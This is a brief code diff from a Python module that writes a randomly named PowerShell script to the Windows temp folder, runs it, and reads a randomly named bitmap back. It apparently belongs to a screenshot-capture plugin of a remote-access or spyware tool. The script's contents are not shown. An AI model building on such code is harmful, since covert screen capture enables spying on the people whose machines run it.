@@ -28,8 +28,8 @@ def run(**args):
 			FILE.write(test)
 			
 		temp_file = os.popen(f'powershell -File {os.environ["TEMP"]}'+'\\dchschsdue.ps1').read().strip()
-		
-		with open(temp_file,"rb") as FILE:
+		img_file_path = os.environ['TEMP']+'\\hjguyghvkjkjbkjbkju9hy8yse.bmp'
+		with open(img_file_path,"rb") as FILE:
 			img = FILE.read()
 			
 	elif sys.platform.lower()=="linux":
